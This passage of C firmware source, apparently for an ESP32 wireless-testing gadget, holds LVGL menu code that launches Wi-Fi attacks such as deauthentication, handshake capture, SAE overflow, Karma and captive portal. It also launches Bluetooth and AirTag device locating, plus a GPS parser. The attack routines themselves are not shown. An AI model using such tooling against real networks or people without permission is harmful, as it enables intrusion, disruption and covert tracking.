        lv_obj_t *yes_lbl = lv_label_create(yes_btn);
        lv_label_set_text(yes_lbl, "YES");
        lv_obj_set_style_text_color(yes_lbl, ui_text_color(), 0);
        lv_obj_center(yes_lbl);
        lv_obj_add_event_cb(yes_btn, blackout_yes_btn_cb, LV_EVENT_CLICKED, NULL);
        
        return;
    }

    if (strcmp(attack_name, "Snifferdog") == 0) {
        // Show warning page - use base to avoid default center label
        create_function_page_base("Snifferdog");
        
        // Warning message in center
        lv_obj_t *warning_label = lv_label_create(function_page);
        lv_label_set_text(warning_label, "Warning: This will start\nSnifferdog attack.\n\nAre you sure?");
        lv_obj_set_style_text_align(warning_label, LV_TEXT_ALIGN_CENTER, 0);
        lv_obj_set_style_text_color(warning_label, ui_text_color(), 0);
        lv_obj_set_style_text_font(warning_label, &lv_font_montserrat_16, 0);
        lv_obj_center(warning_label);
        
        // Button container at bottom (15px higher)
        lv_obj_t *btn_bar = lv_obj_create(function_page);
        lv_obj_set_size(btn_bar, lv_pct(100), 50);
        lv_obj_align(btn_bar, LV_ALIGN_BOTTOM_MID, 0, -15);  // 15px higher
        lv_obj_set_style_bg_color(btn_bar, ui_bg_color(), 0);
        lv_obj_set_style_border_width(btn_bar, 0, 0);
        lv_obj_set_style_radius(btn_bar, 0, 0);
        lv_obj_clear_flag(btn_bar, LV_OBJ_FLAG_SCROLLABLE);
        lv_obj_set_flex_flow(btn_bar, LV_FLEX_FLOW_ROW);
        lv_obj_set_style_pad_all(btn_bar, 4, 0);  // 4px padding
        lv_obj_set_style_pad_gap(btn_bar, 4, 0);  // 4px gap between buttons
        
        // BACK button
        lv_obj_t *back_btn = lv_btn_create(btn_bar);
        lv_obj_set_size(back_btn, 90, 32);
        lv_obj_set_style_bg_color(back_btn, COLOR_MATERIAL_TEAL, LV_STATE_DEFAULT);
        lv_obj_set_style_bg_color(back_btn, lv_color_lighten(COLOR_MATERIAL_TEAL, 30), LV_STATE_PRESSED);
        lv_obj_set_style_border_width(back_btn, 0, 0);
        lv_obj_set_style_radius(back_btn, 8, 0);
        lv_obj_t *back_lbl = lv_label_create(back_btn);
        lv_label_set_text(back_lbl, "BACK");
        lv_obj_set_style_text_color(back_lbl, ui_text_color(), 0);
        lv_obj_center(back_lbl);
        lv_obj_add_event_cb(back_btn, back_to_menu_cb, LV_EVENT_CLICKED, NULL);
        
        // YES button
        lv_obj_t *yes_btn = lv_btn_create(btn_bar);
        lv_obj_set_size(yes_btn, 90, 32);
        lv_obj_set_style_bg_color(yes_btn, COLOR_MATERIAL_GREEN, LV_STATE_DEFAULT);
        lv_obj_set_style_bg_color(yes_btn, lv_color_lighten(COLOR_MATERIAL_GREEN, 30), LV_STATE_PRESSED);
        lv_obj_set_style_border_width(yes_btn, 0, 0);
        lv_obj_set_style_radius(yes_btn, 8, 0);
        lv_obj_t *yes_lbl = lv_label_create(yes_btn);
        lv_label_set_text(yes_lbl, "YES");
        lv_obj_set_style_text_color(yes_lbl, ui_text_color(), 0);
        lv_obj_center(yes_lbl);
        lv_obj_add_event_cb(yes_btn, snifferdog_yes_btn_cb, LV_EVENT_CLICKED, NULL);
        
        return;
    }

    if (strcmp(attack_name, "Sniffer") == 0) {
        // Auto-start Network Observer directly (no confirmation)
        sniffer_yes_btn_cb(NULL);
        return;
    }

    if (strcmp(attack_name, "SAE Overflow") == 0) {
        // Show warning page - use base to avoid default center label
        create_function_page_base("SAE Overflow");
        
        // Warning message in center
        lv_obj_t *warning_label = lv_label_create(function_page);
        lv_label_set_text(warning_label, "Warning: This will start\nSAE Overflow attack.\n\nSelect ONE network first.\n\nAre you sure?");
        lv_obj_set_style_text_align(warning_label, LV_TEXT_ALIGN_CENTER, 0);
        lv_obj_set_style_text_color(warning_label, ui_text_color(), 0);
        lv_obj_set_style_text_font(warning_label, &lv_font_montserrat_16, 0);
        lv_obj_center(warning_label);
        
        // Button container at bottom (15px higher)
        lv_obj_t *btn_bar = lv_obj_create(function_page);
        lv_obj_set_size(btn_bar, lv_pct(100), 50);
        lv_obj_align(btn_bar, LV_ALIGN_BOTTOM_MID, 0, -15);  // 15px higher
        lv_obj_set_style_bg_color(btn_bar, ui_bg_color(), 0);
        lv_obj_set_style_border_width(btn_bar, 0, 0);
        lv_obj_set_style_radius(btn_bar, 0, 0);
        lv_obj_clear_flag(btn_bar, LV_OBJ_FLAG_SCROLLABLE);
        lv_obj_set_flex_flow(btn_bar, LV_FLEX_FLOW_ROW);
        lv_obj_set_style_pad_all(btn_bar, 4, 0);  // 4px padding
        lv_obj_set_style_pad_gap(btn_bar, 4, 0);  // 4px gap between buttons
        
        // BACK button
        lv_obj_t *back_btn = lv_btn_create(btn_bar);
        lv_obj_set_size(back_btn, 90, 32);
        lv_obj_set_style_bg_color(back_btn, COLOR_MATERIAL_TEAL, LV_STATE_DEFAULT);
        lv_obj_set_style_bg_color(back_btn, lv_color_lighten(COLOR_MATERIAL_TEAL, 30), LV_STATE_PRESSED);
        lv_obj_set_style_border_width(back_btn, 0, 0);
        lv_obj_set_style_radius(back_btn, 8, 0);
        lv_obj_t *back_lbl = lv_label_create(back_btn);
        lv_label_set_text(back_lbl, "BACK");
        lv_obj_set_style_text_color(back_lbl, ui_text_color(), 0);
        lv_obj_center(back_lbl);
        lv_obj_add_event_cb(back_btn, back_to_menu_cb, LV_EVENT_CLICKED, NULL);
        
        // YES button
        lv_obj_t *yes_btn = lv_btn_create(btn_bar);
        lv_obj_set_size(yes_btn, 90, 32);
        lv_obj_set_style_bg_color(yes_btn, COLOR_MATERIAL_GREEN, LV_STATE_DEFAULT);
        lv_obj_set_style_bg_color(yes_btn, lv_color_lighten(COLOR_MATERIAL_GREEN, 30), LV_STATE_PRESSED);
        lv_obj_set_style_border_width(yes_btn, 0, 0);
        lv_obj_set_style_radius(yes_btn, 8, 0);
        lv_obj_t *yes_lbl = lv_label_create(yes_btn);
        lv_label_set_text(yes_lbl, "YES");
        lv_obj_set_style_text_color(yes_lbl, ui_text_color(), 0);
        lv_obj_center(yes_lbl);
        lv_obj_add_event_cb(yes_btn, sae_overflow_yes_btn_cb, LV_EVENT_CLICKED, NULL);
        
        return;
    }

    if (strcmp(attack_name, "Handshakes") == 0) {
        // Auto-start handshake attack immediately for all networks
        g_handshaker_global_mode = true;
        handshake_yes_btn_cb(NULL);
        return;
    }

    if (strcmp(attack_name, "Start Wardrive") == 0) {
        wardrive_start_btn_cb(NULL);
        return;
    }

    if (strcmp(attack_name, "Browse Networks") == 0) {
        // Show last scan results with selection state
        ui_locked = true;
        if (function_page) { lv_obj_del(function_page); function_page = NULL; }
        reset_function_page_children();
        show_function_page("Browse Networks");
        scan_list = lv_list_create(function_page);
        lv_obj_set_size(scan_list, lv_pct(100), LCD_V_RES - 30);
        lv_obj_align(scan_list, LV_ALIGN_BOTTOM_MID, 0, 0);
        lv_obj_set_style_bg_color(scan_list, ui_bg_color(), 0);
        lv_obj_set_style_text_color(scan_list, ui_text_color(), 0);
        // Remove separator lines between items
        lv_obj_set_style_border_width(scan_list, 0, LV_PART_ITEMS);
        lv_obj_set_style_border_color(scan_list, ui_bg_color(), LV_PART_ITEMS);

        uint16_t count = wifi_scanner_get_count();
        if (count == 0) {
            lv_obj_t *msg_label = lv_label_create(scan_list);
            lv_label_set_text(msg_label, "Scan networks first");
            lv_obj_set_style_text_color(msg_label, ui_text_color(), 0);
            lv_obj_set_style_text_font(msg_label, &lv_font_montserrat_14, 0);
            lv_obj_center(msg_label);
            return;
        }

        // Fetch last results
        wifi_ap_record_t *records = (wifi_ap_record_t *)lv_mem_alloc(sizeof(wifi_ap_record_t) * count);
        if (!records) return;
        int got = wifi_scanner_get_results(records, count);

        // Build selected set
        int sel_idx[MAX_SCAN_RESULTS];
        int sel_cnt = wifi_scanner_get_selected(sel_idx, MAX_SCAN_RESULTS);
        // Render rows
        for (int i = 0; i < got; i++) {
            lv_obj_t *row = lv_list_add_btn(scan_list, NULL, "");
            lv_obj_set_width(row, lv_pct(100));
            lv_obj_set_flex_flow(row, LV_FLEX_FLOW_ROW);
            lv_obj_set_style_pad_all(row, 8, 0);  // 1.2x bigger (was 6, now 8)
            lv_obj_set_style_pad_gap(row, 10, 0);
            lv_obj_set_height(row, LV_SIZE_CONTENT);
            lv_obj_set_style_bg_color(row, ui_card_color(), LV_STATE_DEFAULT);
            lv_obj_set_style_bg_color(row, lv_color_make(50, 50, 50), LV_STATE_PRESSED);  // Lighter on press
            lv_obj_set_style_radius(row, 8, 0);

            lv_obj_t *cb = lv_checkbox_create(row);
            lv_checkbox_set_text(cb, "");
            lv_obj_add_event_cb(cb, scan_checkbox_event_cb, LV_EVENT_VALUE_CHANGED, (void *)(intptr_t)i);
            // Material checkbox styling
            lv_obj_set_style_bg_color(cb, lv_color_make(60, 60, 60), LV_PART_INDICATOR);  // Dark gray unchecked
            lv_obj_set_style_bg_color(cb, ui_accent_color(), LV_PART_INDICATOR | LV_STATE_CHECKED);  // Material Blue checked
            lv_obj_set_style_border_color(cb, lv_color_make(100, 100, 100), LV_PART_INDICATOR);  // Gray border
            lv_obj_set_style_border_width(cb, 2, LV_PART_INDICATOR);
            lv_obj_set_style_radius(cb, 4, LV_PART_INDICATOR);  // Rounded
            lv_obj_set_style_text_color(cb, ui_text_color(), 0);
            lv_obj_set_style_pad_all(cb, 6, LV_PART_MAIN);
            // Check if selected
            bool is_selected = false;
            for (int s = 0; s < sel_cnt; s++) { if (sel_idx[s] == i) { is_selected = true; break; } }
            if (is_selected) lv_obj_add_state(cb, LV_STATE_CHECKED);

            lv_obj_t *ssid_lbl = lv_label_create(row);
            char name_buf[128];
            const char *band = (records[i].primary <= 14) ? "2.4GHz" : "5GHz";
            if (records[i].ssid[0] != 0) {
                snprintf(name_buf, sizeof(name_buf), "%s (%s, %02X:%02X:%02X:%02X:%02X:%02X)", 
                         (const char *)records[i].ssid, band,
                         records[i].bssid[0], records[i].bssid[1], records[i].bssid[2],
                         records[i].bssid[3], records[i].bssid[4], records[i].bssid[5]);
            } else {
                snprintf(name_buf, sizeof(name_buf), "%02X:%02X:%02X:%02X:%02X:%02X (%s)",
                         records[i].bssid[0], records[i].bssid[1], records[i].bssid[2],
                         records[i].bssid[3], records[i].bssid[4], records[i].bssid[5], band);
            }
            lv_label_set_text(ssid_lbl, name_buf);
            lv_label_set_long_mode(ssid_lbl, LV_LABEL_LONG_SCROLL_CIRCULAR);
            lv_obj_set_style_text_font(ssid_lbl, &lv_font_montserrat_14, 0);
            lv_obj_set_style_text_color(ssid_lbl, ui_text_color(), 0);
            lv_obj_align(ssid_lbl, LV_ALIGN_LEFT_MID, 0, 5);  // 5px down for better alignment
            lv_obj_set_width(ssid_lbl, lv_pct(85));

            if ((i & 3) == 3) {
                vTaskDelay(pdMS_TO_TICKS(1));
            }
        }
        lv_mem_free(records);
        ui_locked = false;
        return;
    }

    if (strcmp(attack_name, "Karma") == 0) {
        show_karma_page();
        return;
    }

    if (strcmp(attack_name, "Portal") == 0) {
        show_portal_page();
        return;
    }

    if (strcmp(attack_name, "Browse Clients") == 0) {
        // Show sniffer AP list with clients (indented)
        ui_locked = true;
        if (function_page) { lv_obj_del(function_page); function_page = NULL; }
        reset_function_page_children();
        show_function_page("Browse Clients");
        
        lv_obj_t *list = lv_list_create(function_page);
        lv_obj_set_size(list, lv_pct(100), LCD_V_RES - 30 - 50);
        lv_obj_align(list, LV_ALIGN_TOP_MID, 0, 30);
        lv_obj_set_style_bg_color(list, ui_bg_color(), 0);
        lv_obj_set_style_text_color(list, ui_text_color(), 0);
        lv_obj_set_style_border_width(list, 0, LV_PART_ITEMS);
        lv_obj_set_style_border_color(list, lv_color_make(0, 0, 0), LV_PART_ITEMS);
        
        int ap_count = 0;
        const sniffer_ap_t *aps = wifi_sniffer_get_aps(&ap_count);
        
        if (ap_count == 0 || aps == NULL) {
            lv_obj_t *msg_label = lv_label_create(list);
            lv_label_set_text(msg_label, "No APs sniffed yet.\nRun Sniffer first.");
            lv_obj_set_style_text_color(msg_label, ui_text_color(), 0);
            lv_obj_set_style_text_font(msg_label, &lv_font_montserrat_14, 0);
        } else {
            int displayed_aps = 0;
            for (int i = 0; i < ap_count; i++) {
                const sniffer_ap_t *ap = &aps[i];
                
                // Skip APs with no clients
                if (ap->client_count == 0) {
                    continue;
                }
                
                displayed_aps++;
                
                // AP row (bold/larger)
                lv_obj_t *ap_row = lv_list_add_btn(list, LV_SYMBOL_WIFI, "");
                lv_obj_set_width(ap_row, lv_pct(100));
                lv_obj_set_style_bg_color(ap_row, ui_bg_color(), LV_STATE_DEFAULT);
                lv_obj_set_style_pad_all(ap_row, 6, 0);
                
                lv_obj_t *ap_label = lv_label_create(ap_row);
                char ap_text[128];
                if (ap->ssid[0] != '\0') {
                    snprintf(ap_text, sizeof(ap_text), "%s (%02X:%02X:%02X:%02X:%02X:%02X) [%d clients]",
                             ap->ssid, ap->bssid[0], ap->bssid[1], ap->bssid[2],
                             ap->bssid[3], ap->bssid[4], ap->bssid[5], ap->client_count);
                } else {
                    snprintf(ap_text, sizeof(ap_text), "<hidden> (%02X:%02X:%02X:%02X:%02X:%02X) [%d clients]",
                             ap->bssid[0], ap->bssid[1], ap->bssid[2],
                             ap->bssid[3], ap->bssid[4], ap->bssid[5], ap->client_count);
                }
                lv_label_set_text(ap_label, ap_text);
                lv_obj_set_style_text_color(ap_label, ui_text_color(), 0);
                lv_obj_set_style_text_font(ap_label, &lv_font_montserrat_14, 0);
                lv_label_set_long_mode(ap_label, LV_LABEL_LONG_SCROLL_CIRCULAR);
                lv_obj_set_width(ap_label, lv_pct(85));
                
                // Client rows (indented) - clickable for targeted deauth
                for (int j = 0; j < ap->client_count && j < MAX_CLIENTS_PER_AP; j++) {
                    const sniffer_client_t *client = &ap->clients[j];
                    
                    lv_obj_t *client_row = lv_list_add_btn(list, NULL, "");
                    lv_obj_set_width(client_row, lv_pct(100));
                    lv_obj_set_style_bg_color(client_row, ui_bg_color(), LV_STATE_DEFAULT);
                    lv_obj_set_style_bg_color(client_row, lv_color_make(50, 50, 50), LV_STATE_PRESSED);
                    lv_obj_set_style_pad_left(client_row, 30, 0);  // Indent
                    lv_obj_set_style_pad_all(client_row, 4, 0);
                    
                    lv_obj_t *client_label = lv_label_create(client_row);
                    char client_text[96];
                    snprintf(client_text, sizeof(client_text), "%02X:%02X:%02X:%02X:%02X:%02X (RSSI: %d)",
                             client->mac[0], client->mac[1], client->mac[2],
                             client->mac[3], client->mac[4], client->mac[5], client->rssi);
                    lv_label_set_text(client_label, client_text);
                    lv_obj_set_style_text_color(client_label, lv_color_make(0, 200, 0), 0);  // Slightly dimmer green
                    lv_obj_set_style_text_font(client_label, &lv_font_montserrat_12, 0);  // Smaller font
                    lv_label_set_long_mode(client_label, LV_LABEL_LONG_SCROLL_CIRCULAR);
                    lv_obj_set_width(client_label, lv_pct(80));
                    
                    // Add click callback for targeted deauth (encode ap_index and client_index)
                    int user_data = (i << 8) | j;
                    lv_obj_add_event_cb(client_row, sniffer_client_click_cb, LV_EVENT_CLICKED, (void*)(intptr_t)user_data);
                }
                
                // Throttle UI updates every 4 APs
                if ((displayed_aps & 3) == 3) {
                    vTaskDelay(pdMS_TO_TICKS(1));
                }
            }
            
            // If no APs with clients found, show message
            if (displayed_aps == 0) {
                lv_obj_t *msg_label = lv_label_create(list);
                lv_label_set_text(msg_label, "No clients detected yet.\nAPs found but no clients.");
                lv_obj_set_style_text_color(msg_label, ui_text_color(), 0);
                lv_obj_set_style_text_font(msg_label, &lv_font_montserrat_14, 0);
            }
        }
        
        // Back button
        lv_obj_t *back_btn = lv_btn_create(function_page);
        lv_obj_set_size(back_btn, 100, 35);
        lv_obj_align(back_btn, LV_ALIGN_BOTTOM_MID, 0, -5);
        lv_obj_set_style_bg_color(back_btn, COLOR_MATERIAL_TEAL, LV_STATE_DEFAULT);
        lv_obj_set_style_bg_color(back_btn, lv_color_lighten(COLOR_MATERIAL_TEAL, 30), LV_STATE_PRESSED);
        lv_obj_set_style_border_width(back_btn, 0, 0);
        lv_obj_set_style_radius(back_btn, 8, 0);
        lv_obj_t *back_lbl = lv_label_create(back_btn);
        lv_label_set_text(back_lbl, "Back");
        lv_obj_set_style_text_color(back_lbl, ui_text_color(), 0);
        lv_obj_center(back_lbl);
        lv_obj_add_event_cb(back_btn, back_to_menu_cb, LV_EVENT_CLICKED, NULL);
        
        ui_locked = false;
        return;
    }

    if (strcmp(attack_name, "Show Probes") == 0) {
        // Show probe requests list
        ui_locked = true;
        if (function_page) { lv_obj_del(function_page); function_page = NULL; }
        reset_function_page_children();
        show_function_page("Show Probes");
        
        lv_obj_t *list = lv_list_create(function_page);
        lv_obj_set_size(list, lv_pct(100), LCD_V_RES - 30 - 50);
        lv_obj_align(list, LV_ALIGN_TOP_MID, 0, 30);
        lv_obj_set_style_bg_color(list, ui_bg_color(), 0);
        lv_obj_set_style_text_color(list, ui_text_color(), 0);
        lv_obj_set_style_border_width(list, 0, LV_PART_ITEMS);
        lv_obj_set_style_border_color(list, lv_color_make(0, 0, 0), LV_PART_ITEMS);
        
        int probe_count = 0;
        const probe_request_t *probes = wifi_sniffer_get_probes(&probe_count);
        
        if (probe_count == 0 || probes == NULL) {
            lv_obj_t *msg_label = lv_label_create(list);
            lv_label_set_text(msg_label, "No probes sniffed yet.\nRun Sniffer first.");
            lv_obj_set_style_text_color(msg_label, ui_text_color(), 0);
            lv_obj_set_style_text_font(msg_label, &lv_font_montserrat_14, 0);
        } else {
            for (int i = 0; i < probe_count; i++) {
                const probe_request_t *probe = &probes[i];
                
                lv_obj_t *probe_row = lv_list_add_btn(list, LV_SYMBOL_CALL, "");
                lv_obj_set_width(probe_row, lv_pct(100));
                lv_obj_set_style_bg_color(probe_row, ui_bg_color(), LV_STATE_DEFAULT);
                lv_obj_set_style_pad_all(probe_row, 6, 0);
                
                lv_obj_t *probe_label = lv_label_create(probe_row);
                char probe_text[160];
                if (probe->ssid[0] != '\0') {
                    snprintf(probe_text, sizeof(probe_text), "%02X:%02X:%02X:%02X:%02X:%02X \"%s\" (RSSI: %d)",
                             probe->mac[0], probe->mac[1], probe->mac[2],
                             probe->mac[3], probe->mac[4], probe->mac[5],
                             probe->ssid, probe->rssi);
                } else {
                    snprintf(probe_text, sizeof(probe_text), "%02X:%02X:%02X:%02X:%02X:%02X <broadcast> (RSSI: %d)",
                             probe->mac[0], probe->mac[1], probe->mac[2],
                             probe->mac[3], probe->mac[4], probe->mac[5], probe->rssi);
                }
                lv_label_set_text(probe_label, probe_text);
                lv_obj_set_style_text_color(probe_label, ui_text_color(), 0);
                lv_obj_set_style_text_font(probe_label, &lv_font_montserrat_12, 0);
                lv_label_set_long_mode(probe_label, LV_LABEL_LONG_SCROLL_CIRCULAR);
                lv_obj_set_width(probe_label, lv_pct(85));
                
                // Throttle UI updates every 8 probes
                if ((i & 7) == 7) {
                    vTaskDelay(pdMS_TO_TICKS(1));
                }
            }
        }
        
        // Back button
        lv_obj_t *back_btn = lv_btn_create(function_page);
        lv_obj_set_size(back_btn, 100, 35);
        lv_obj_align(back_btn, LV_ALIGN_BOTTOM_MID, 0, -5);
        lv_obj_set_style_bg_color(back_btn, COLOR_MATERIAL_TEAL, LV_STATE_DEFAULT);
        lv_obj_set_style_bg_color(back_btn, lv_color_lighten(COLOR_MATERIAL_TEAL, 30), LV_STATE_PRESSED);
        lv_obj_set_style_border_width(back_btn, 0, 0);
        lv_obj_set_style_radius(back_btn, 8, 0);
        lv_obj_t *back_lbl = lv_label_create(back_btn);
        lv_label_set_text(back_lbl, "Back");
        lv_obj_set_style_text_color(back_lbl, ui_text_color(), 0);
        lv_obj_center(back_lbl);
        lv_obj_add_event_cb(back_btn, back_to_menu_cb, LV_EVENT_CLICKED, NULL);
        
        ui_locked = false;
        return;
    }

    if (strcmp(attack_name, "BLE Scan") == 0) {
        // BLE Scanner - switch from WiFi to BLE mode and scan
        ui_locked = true;
        if (function_page) { lv_obj_del(function_page); function_page = NULL; }
        reset_function_page_children();
        
        // Create base page
        create_function_page_base("BLE Scan");
        ble_scan_ui_active = true;
        
        // Status label below title bar (30px from top)
        ble_scan_status_label = lv_label_create(function_page);
        lv_label_set_text(ble_scan_status_label, "Initializing BLE...");
        lv_obj_set_style_text_color(ble_scan_status_label, ui_text_color(), 0);
        lv_obj_set_style_text_font(ble_scan_status_label, &lv_font_montserrat_14, 0);
        lv_obj_align(ble_scan_status_label, LV_ALIGN_TOP_LEFT, 5, 35);
        
        // Scrollable list for devices (starts below status label)
        ble_scan_list = lv_obj_create(function_page);
        lv_obj_set_size(ble_scan_list, lv_pct(100), LCD_V_RES - 30 - 70 - 25);  // Leave space for title, status and exit button
        lv_obj_align(ble_scan_list, LV_ALIGN_TOP_MID, 0, 55);
        lv_obj_set_style_bg_color(ble_scan_list, ui_bg_color(), 0);
        lv_obj_set_style_border_color(ble_scan_list, lv_color_make(0, 100, 0), 0);
        lv_obj_set_style_border_width(ble_scan_list, 1, 0);
        lv_obj_set_flex_flow(ble_scan_list, LV_FLEX_FLOW_COLUMN);
        lv_obj_set_style_pad_all(ble_scan_list, 4, 0);
        lv_obj_set_scrollbar_mode(ble_scan_list, LV_SCROLLBAR_MODE_AUTO);
        
        // Red Exit button (like AirTag scanner)
        lv_obj_t *back_btn = lv_btn_create(function_page);
        lv_obj_set_size(back_btn, 120, 55);
        lv_obj_align(back_btn, LV_ALIGN_BOTTOM_MID, 0, -10);
        lv_obj_set_style_bg_color(back_btn, COLOR_MATERIAL_RED, LV_STATE_DEFAULT);
        lv_obj_set_style_bg_color(back_btn, lv_color_lighten(COLOR_MATERIAL_RED, 50), LV_STATE_PRESSED);
        lv_obj_set_style_border_width(back_btn, 0, 0);
        lv_obj_set_style_radius(back_btn, 10, 0);
        lv_obj_set_style_shadow_width(back_btn, 6, 0);
        lv_obj_set_style_shadow_color(back_btn, lv_color_make(0, 0, 0), 0);
        lv_obj_set_style_shadow_opa(back_btn, LV_OPA_40, 0);
        lv_obj_set_flex_flow(back_btn, LV_FLEX_FLOW_COLUMN);
        lv_obj_set_flex_align(back_btn, LV_FLEX_ALIGN_CENTER, LV_FLEX_ALIGN_CENTER, LV_FLEX_ALIGN_CENTER);
        
        lv_obj_t *back_icon = lv_label_create(back_btn);
        lv_label_set_text(back_icon, LV_SYMBOL_CLOSE);
        lv_obj_set_style_text_font(back_icon, &lv_font_montserrat_20, 0);
        lv_obj_set_style_text_color(back_icon, ui_text_color(), 0);
        
        lv_obj_t *back_lbl = lv_label_create(back_btn);
        lv_label_set_text(back_lbl, "Exit");
        lv_obj_set_style_text_font(back_lbl, &lv_font_montserrat_12, 0);
        lv_obj_set_style_text_color(back_lbl, ui_text_color(), 0);
        
        lv_obj_add_event_cb(back_btn, ble_scan_back_btn_cb, LV_EVENT_CLICKED, NULL);
        
        // Switch to BLE mode
        if (!ensure_ble_mode()) {
            lv_label_set_text(ble_scan_status_label, "BLE init failed!");
            ui_locked = false;
            return;
        }
        
        // Start BLE scan task
        bt_scan_active = true;
        BaseType_t task_ret = xTaskCreate(
            bt_scan_task,
            "bt_scan_task",
            4096,
            NULL,
            5,
            &bt_scan_task_handle
        );
        
        if (task_ret != pdPASS) {
            bt_scan_active = false;
            lv_label_set_text(ble_scan_status_label, "Failed to start scan task!");
        } else {
            lv_label_set_text(ble_scan_status_label, "Scanning... 0 devices (10s)");
        }
        
        ui_locked = false;
        return;
    }

    // AirTag scan
    if (strcmp(attack_name, "AirTag scan") == 0) {
        if (bt_lookout_is_active())
            show_bt_conflict_warning("AirTag Scan", show_airtag_scan_screen);
        else
            show_airtag_scan_screen();
        return;
    }

    // BT Scan & Select
    if (strcmp(attack_name, "BT Scan & Select") == 0) {
        if (bt_lookout_is_active())
            show_bt_conflict_warning("BT Scan & Select", show_bt_scan_select_screen);
        else
            show_bt_scan_select_screen();
        return;
    }

    // BT Locator (standalone scan-then-select flow)
    if (strcmp(attack_name, "BT Locator") == 0) {
        if (bt_lookout_is_active())
            show_bt_conflict_warning("BT Locator", show_bt_locator_screen);
        else
            show_bt_locator_screen();
        return;
    }

    // BT Locator Direct (skip scan, track SAS-selected device immediately)
    if (strcmp(attack_name, "BT Locator Direct") == 0) {
        if (bt_lookout_is_active())
            show_bt_conflict_warning("BT Locator", show_bt_locator_direct_track);
        else
            show_bt_locator_direct_track();
        return;
    }

    // GATT Walker — BLE GATT inspector
    if (strcmp(attack_name, "GATT Walker") == 0) {
        show_gatt_walker_screen();
        return;
    }

    // BT Lookout screen
    if (strcmp(attack_name, "Dee Dee Detector") == 0) {
        show_bt_lookout_screen();
        return;
    }

    // Add BT Scan & Select target to BT Lookout watchlist
    if (strcmp(attack_name, "Add to Lookout") == 0) {
        char mac_str[18];
        snprintf(mac_str, sizeof(mac_str), "%02X:%02X:%02X:%02X:%02X:%02X",
                 bt_sas_target_addr[0], bt_sas_target_addr[1], bt_sas_target_addr[2],
                 bt_sas_target_addr[3], bt_sas_target_addr[4], bt_sas_target_addr[5]);
        const char *disp_name = bt_sas_target_name[0] ? bt_sas_target_name : mac_str;
        ensure_sd_mounted();
        bool saved = false;
        if (sd_spi_mutex && xSemaphoreTake(sd_spi_mutex, pdMS_TO_TICKS(500)) == pdTRUE) {
            saved = bt_lookout_append(BT_LOOKOUT_CSV_PATH, bt_sas_target_addr,
                                      bt_sas_target_name[0] ? bt_sas_target_name : NULL,
                                      BT_LOOKOUT_RSSI_ANY, false);
            xSemaphoreGive(sd_spi_mutex);
        }
        if (saved) {
            show_bt_lookout_screen();   /* navigate directly to BT Lookout */
        } else {
            show_lookout_alert_popup(disp_name, "Save failed — check SD card", 0);
        }
        return;
    }

    // Stub screens for not-yet-implemented features
    if (strcmp(attack_name, "Package Monitor") == 0 ||
        strcmp(attack_name, "Channel View") == 0) {
        show_stub_screen(attack_name, NULL);
        return;
    }

    // Default: open function page
    show_function_page(attack_name);
}

// Standard stdio behavior restored; no write overrides

// === GPS IMPLEMENTATION ===
static esp_err_t init_gps_uart(void)
{
	uart_config_t uart_config = {
		.baud_rate = 9600,
		.data_bits = UART_DATA_8_BITS,
		.parity = UART_PARITY_DISABLE,
		.stop_bits = UART_STOP_BITS_1,
		.flow_ctrl = UART_HW_FLOWCTRL_DISABLE,
		.source_clk = UART_SCLK_DEFAULT,
	};

	esp_err_t err;
	if ((err = uart_driver_install(GPS_UART_NUM, GPS_BUF_SIZE * 2, 0, 0, NULL, 0)) != ESP_OK) return err;
	if ((err = uart_param_config(GPS_UART_NUM, &uart_config)) != ESP_OK) return err;
	if ((err = uart_set_pin(GPS_UART_NUM, GPS_TX_PIN, GPS_RX_PIN, UART_PIN_NO_CHANGE, UART_PIN_NO_CHANGE)) != ESP_OK) return err;
	return ESP_OK;
}

static bool parse_gps_nmea(const char *nmea_sentence)
{
	if (!nmea_sentence || strlen(nmea_sentence) < 10) return false;
	// Parse GPGGA or GNGGA for fix
	if (strncmp(nmea_sentence, "$GPGGA", 6) == 0 || strncmp(nmea_sentence, "$GNGGA", 6) == 0) {
		char sentence[256];
		strncpy(sentence, nmea_sentence, sizeof(sentence) - 1);
		sentence[sizeof(sentence) - 1] = '\0';

		char *token = strtok(sentence, ",");
		int field = 0;
		float lat_deg = 0, lat_min = 0;
		float lon_deg = 0, lon_min = 0;
		char lat_dir = 'N', lon_dir = 'E';
		int quality = 0;
		float altitude = 0;
		float hdop = 1.0f;

		while (token != NULL) {
			switch (field) {
				case 1: // UTC time HHMMSS.SS
					if (strlen(token) >= 6) {
						snprintf(current_gps.time_utc, sizeof(current_gps.time_utc),
						         "%c%c:%c%c:%c%c",
						         token[0], token[1], token[2],
						         token[3], token[4], token[5]);
					}
					break;
				case 2: // Latitude DDMM.MMMM
					if (strlen(token) > 4) { lat_deg = (token[0]-'0')*10 + (token[1]-'0'); lat_min = atof(token+2); }
					break;
				case 3: lat_dir = token[0]; break;
				case 4: // Longitude DDDMM.MMMM
					if (strlen(token) > 5) { lon_deg = (token[0]-'0')*100 + (token[1]-'0')*10 + (token[2]-'0'); lon_min = atof(token+3); }
					break;
				case 5: lon_dir = token[0]; break;
				case 6: quality = atoi(token); break;
				case 7: current_gps.satellites = atoi(token); break;
				case 8: hdop = atof(token); break;
				case 9: altitude = atof(token); break;
			}
			token = strtok(NULL, ",");
			field++;
		}

		if (quality > 0) {
			current_gps.latitude = lat_deg + lat_min / 60.0f;
			if (lat_dir == 'S') current_gps.latitude = -current_gps.latitude;
			current_gps.longitude = lon_deg + lon_min / 60.0f;
			if (lon_dir == 'W') current_gps.longitude = -current_gps.longitude;
			current_gps.altitude = altitude;
			current_gps.accuracy = hdop * 4.0f;
			current_gps.valid = true;
			return true;
		}
	}

	// Parse GPRMC/GNRMC — carries date+time; use to sync system clock once on fix
	if (strncmp(nmea_sentence, "$GPRMC", 6) == 0 || strncmp(nmea_sentence, "$GNRMC", 6) == 0) {
		char sentence[256];
		strncpy(sentence, nmea_sentence, sizeof(sentence) - 1);
		sentence[sizeof(sentence) - 1] = '\0';

		char *token = strtok(sentence, ",");
		int field = 0;
		char status = 'V';
		int hh = 0, mm = 0, ss = 0, day = 0, mon = 0, yr = 0;

		while (token != NULL) {
			switch (field) {
				case 1: // HHMMSS.SS
					if (strlen(token) >= 6) {
						hh = (token[0]-'0')*10 + (token[1]-'0');
						mm = (token[2]-'0')*10 + (token[3]-'0');
						ss = (token[4]-'0')*10 + (token[5]-'0');
					}
					break;
				case 2: status = token[0]; break; // A=active, V=void
				case 9: // DDMMYY
					if (strlen(token) >= 6) {
						day = (token[0]-'0')*10 + (token[1]-'0');
						mon = (token[2]-'0')*10 + (token[3]-'0');
						yr  = (token[4]-'0')*10 + (token[5]-'0');
					}
					break;
			}
